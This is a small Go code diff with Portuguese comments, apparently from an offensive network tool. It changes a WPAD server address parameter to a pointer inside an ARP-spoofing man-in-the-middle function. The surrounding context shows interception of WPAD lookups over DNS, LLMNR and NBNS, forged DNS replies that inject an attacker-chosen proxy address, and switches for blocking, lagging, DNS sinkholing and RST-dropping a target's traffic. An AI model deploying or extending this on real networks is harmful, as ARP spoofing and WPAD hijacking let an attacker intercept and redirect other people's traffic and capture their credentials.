@@ -457,7 +457,7 @@ func (s *SnifferService) SniffNetwork(ctx context.Context) error {
 // a captura de TTL, SNI, DNS e outros dados mesmo de máquinas em Modo Furtivo.
 // O parâmetro showLogs controla a exibição em tempo real dos logs de interceptação no terminal.
 // O parâmetro wpadFileInjection e wpadServerAddr controlam a injeção de WPAD para auto-proxy.
-func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool, wpadFileInjection *atomic.Bool, wpadServerAddr string) error {
+func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC string, showLogs *atomic.Bool, showTracer *atomic.Bool, isBlocked *atomic.Bool, rstDropPercent *atomic.Int32, isLagged *atomic.Bool, isDNSSinkhole *atomic.Bool, isICMPUnreachable *atomic.Bool, wpadFileInjection *atomic.Bool, wpadServerAddr *string) error {
 	devices, err := pcap.FindAllDevs()
 	if err != nil {
 		log.Println("  [-] Erro ao buscar interfaces:", err)
@@ -694,7 +694,7 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 										if strings.HasPrefix(queryName, "wpad") {
 											pktCopy := make([]byte, len(data))
 											copy(pktCopy, data)
-											s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC, wpadServerAddr)
+											s.forgeDNSResponse(captureHandle, pktCopy, myMAC, targetMAC, *wpadServerAddr)
 											if showLogs != nil && showLogs.Load() {
 												protocol := "DNS"
 												if dstPort == 5355 {
@@ -702,7 +702,7 @@ func (s *SnifferService) ARPSpoofMitM(ctx context.Context, targetIP, manualMAC s
 												} else if dstPort == 137 {
 													protocol = "NBNS"
 												}
-												fmt.Printf("  [MitM] Interceptada query WPAD via %s (%s), injetando IP: %s\n", protocol, queryName, wpadServerAddr)
+												fmt.Printf("  [MitM] Interceptada query WPAD via %s (%s), injetando IP: %s\n", protocol, queryName, *wpadServerAddr)
 											}
 											continue // Não encaminha a query LLMNR/NBNS para o roteador
 										}
